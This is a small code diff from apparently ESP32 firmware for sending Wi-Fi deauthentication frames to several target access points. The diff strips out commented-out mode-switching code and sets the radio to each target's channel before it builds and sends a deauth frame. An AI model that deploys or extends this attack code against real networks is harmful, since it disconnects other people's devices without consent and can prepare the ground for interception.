@@ -78,20 +78,8 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
         ESP_LOGI(TAG, "Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                  ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                  ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
-
-        //ESP_LOGI(TAG, "Disconnecting Wi-Fi wifictl_sta_disconnect()");
-        //wifictl_sta_disconnect();          
-        //vTaskDelay(pdMS_TO_TICKS(500)); 
-
-        //esp_wifi_set_mode(WIFI_MODE_STA); // Przełączenie na sam STA
-        //wifictl_set_channel(ap_record->primary);
-        //vTaskDelay(pdMS_TO_TICKS(500)); // Krótka pauza
-        //esp_wifi_set_mode(WIFI_MODE_APSTA); // Powrót do APSTA
-
-        //ESP_LOGW(TAG, "Restarting Wi-Fi to apply channel change...");
-        //esp_wifi_stop();
-        //vTaskDelay(pdMS_TO_TICKS(500)); 
-        //esp_wifi_start();
+      
+        wifictl_set_channel(ap_record->primary);
 
         uint8_t deauth_frame[sizeof(deauth_frame_default)];
         memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
